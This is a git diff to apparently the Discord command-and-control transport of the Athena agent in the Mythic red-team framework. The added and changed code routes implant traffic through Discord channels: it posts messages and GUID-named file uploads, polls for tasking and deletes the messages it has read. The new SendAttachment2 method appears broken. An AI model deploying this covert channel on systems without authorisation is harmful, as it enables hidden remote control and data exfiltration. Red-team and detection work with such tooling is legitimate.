@@ -45,7 +45,9 @@ namespace Athena.Config
         public string psk { get; set; }
         public bool encryptedExchangeCheck { get; set; }
         private HttpClient discordClient { get; set; }
+        private string BotToken { get; set; }
         private string ChannelID { get; set; }
+        //  private string current_message { get; set; }
         private int timeBetweenChecks { get; set; } //How long (in seconds) to wait in between checks
         private string userAgent { get; set; }
         public string proxyHost { get; set; }
@@ -56,7 +58,7 @@ namespace Athena.Config
         {
             this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
             this.messageToken = "discord_token";
-            this.ChannelID = "channel_id";
+            this.ChannelID = "bot_channel";
             this.userAgent = "%USERAGENT%";
             this.messageChecks = int.Parse("message_checks");
             this.timeBetweenChecks = int.Parse("time_between_checks");
@@ -100,11 +102,14 @@ namespace Athena.Config
                 this.discordClient.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
             }
         }
-
-       public async Task<string> Send(object obj)
+        //Dockerfile, config.json, c2_server.sh, C2_RPC_functions, dicsord.py
+        public async Task<string> Send(object obj)
         {
             try
             {
+                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+                //This will check to see if it needs to be encrypted first and convert the string properly. You can likely keep this here.
+                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                 string json = JsonConvert.SerializeObject(obj);
                 if (this.encrypted)
                 {
@@ -174,18 +179,20 @@ namespace Athena.Config
                         }
                     }
                     checkins++;
-                    if(checkins == this.messageChecks)
+                    if (checkins == this.messageChecks)
                     {
                         return "";
                     }
 
                 } while (agentMessages.Count() < 1);
-                    
+
                 //No concept of chunking yet, so just grab one
                 json = agentMessages.FirstOrDefault().message;
                 DeleteMessages(msgToRemove);
 
-
+                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+                //This will check to see if it needs to be decrypted first and convert the string properly. You can likely keep this here.
+                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                 if (this.encrypted)
                 {
                     return this.crypt.Decrypt(json);
@@ -210,23 +217,60 @@ namespace Athena.Config
         public async Task<bool> SendMessage(string msg)
         {
             string url = "https://discord.com/api/channels/" + this.ChannelID + "/messages";
-            
-            Dictionary<string,string> Payload = new Dictionary<string, string>()
+
+            Dictionary<string, string> Payload = new Dictionary<string, string>()
             {
               {"content" , msg }
             };
-            
+
             StringContent content = new StringContent(JsonConvert.SerializeObject(Payload), Encoding.UTF8, "application/json");
             HttpResponseMessage res = await discordClient.PostAsync(url, content);
 
             return res.IsSuccessStatusCode ? true : false;
         }
-        public async Task<List<DiscordMessage>> ReadMessages()
+
+        public async Task<List<ServerDetails>> ReadMessages()
         {
             var url = "https://discordapp.com/api/channels/" + this.ChannelID + "/" + "messages?limit=10";
             var res = await discordClient.GetAsync(url);
-            return JsonConvert.DeserializeObject<List<DiscordMessage>>(await res.Content.ReadAsStringAsync()) ?? new List<DiscordMessage>(); // eithe return the responses Or if it fails get a derisalised response AKA with d ata or no data
+            string ResponseMessages = await res.Content.ReadAsStringAsync();
+            return JsonConvert.DeserializeObject<List<ServerDetails>>(ResponseMessages) ?? new List<ServerDetails>(); // eithe return the responses Or if it fails get a derisalised response AKA with d ata or no data
         }
+
+        public async Task<bool> SendAttachment2(string msg) //8mb by default, A file upload size limit applies to all files in a request 
+        {
+            try
+            {
+                byte[] msgBytes = System.Text.Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(msg));
+                string url = "https://discord.com/api/channels/" + ChannelID + "/messages";
+                MultipartFormDataContent content = new MultipartFormDataContent();
+                ByteArrayContent fileContent = new ByteArrayContent(msgBytes);
+                fileContent.Headers.ContentType = new MediaTypeHeaderValue("multipart/form-data");
+                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("filename")
+                {
+                    FileName = agent_guid + ".txt",
+                };
+
+                content.Add(fileContent);
+
+                using (MemoryStream stream = new MemoryStream(msgBytes))
+                {
+                    var res = await discordClient.PostAsync(url, fileContent);
+                    string responseMessage = await res.Content.ReadAsStringAsync();
+                    if (res.IsSuccessStatusCode)
+                    {
+                        return true;
+                    }
+                }
+                return false;
+            }
+            catch
+            {
+                return false;
+            }
+
+        }
+
         public async Task<bool> SendAttachment(string msg) //8mb by default, A file upload size limit applies to all files in a request 
         {
             try
@@ -240,7 +284,7 @@ namespace Athena.Config
                     File_Content.Headers.ContentType = new MediaTypeHeaderValue("multipart/form-data");
                     File_Content.Headers.ContentDisposition = new ContentDispositionHeaderValue("filename")
                     {
-                        FileName =  agent_guid + ".server",
+                        FileName = agent_guid + ".server",
                     };
                     Content.Add(File_Content);
                     var res = await discordClient.PostAsync(URL, Content);
@@ -259,6 +303,7 @@ namespace Athena.Config
             }
 
         }
+
         private async Task<string> GetFileContentsAsync(string url)
         {
             string message;
@@ -270,7 +315,7 @@ namespace Athena.Config
                 {
                     message = await content.ReadAsStringAsync();
                 }
-                
+
                 if (response.IsSuccessStatusCode)
                 {
                     return await Unescape(message);
@@ -278,9 +323,10 @@ namespace Athena.Config
                 return "";
             }
         }
+
         private async Task<string> Unescape(string message)
         {
-            return message.TrimStart('"').TrimEnd('"').Replace("\\\"","\"");
+            return message.TrimStart('"').TrimEnd('"').Replace("\\\"", "\"");
 
         }
         public async Task<bool> DeleteMessages(List<string> messages) //server and guild are the same lol
@@ -292,7 +338,7 @@ namespace Athena.Config
                 var res = await discordClient.DeleteAsync(url);
                 success = res.IsSuccessStatusCode;
             }
-            
+
             return success;
         }
         public class MythicMessageWrapper
@@ -302,6 +348,26 @@ namespace Athena.Config
             public bool to_server { get; set; }
             public int id { get; set; }
             public bool final { get; set; }
+        }
+
+        //adding Json Classes
+        public class GetServerDetails
+        {
+            public string id { get; set; }
+            public int type { get; set; }
+            public string name { get; set; }
+            public int position { get; set; }
+            public int flags { get; set; }
+            public string parent_id { get; set; }
+            public string guild_id { get; set; }
+            public List<object> permission_overwrites { get; set; }
+            public string last_message_id { get; set; }
+            public object topic { get; set; }
+            public int? rate_limit_per_user { get; set; }
+            public bool? nsfw { get; set; }
+            public int? bitrate { get; set; }
+            public int? user_limit { get; set; }
+            public object rtc_region { get; set; }
         }
         public class Author
         {
@@ -313,7 +379,7 @@ namespace Athena.Config
             public int public_flags { get; set; }
             public bool? bot { get; set; }
         }
-        public class DiscordMessage
+        public class ServerDetails
         {
             public string id { get; set; }
             public int type { get; set; }
@@ -333,11 +399,31 @@ namespace Athena.Config
             public List<object> components { get; set; }
             public string webhook_id { get; set; }
         }
+        public class ChannelResponse
+        {
+            public string id { get; set; }
+            public object last_message_id { get; set; }
+            public int type { get; set; }
+            public string name { get; set; }
+            public int position { get; set; }
+            public int flags { get; set; }
+            public object parent_id { get; set; }
+            public object topic { get; set; }
+            public string guild_id { get; set; }
+            public List<object> permission_overwrites { get; set; }
+            public int rate_limit_per_user { get; set; }
+            public bool nsfw { get; set; }
+        }
+        public class ChannelCreateSend
+        {
+            public string name { get; set; }
+            public int type { get; set; }
+        }
         public class Attachment
         {
             public string id { get; set; }
             public string filename { get; set; }
-            public string? description {get; set;}
+            public string? description { get; set; }
             public string? content_type { get; set; }
             public int size { get; set; }
             public string url { get; set; }
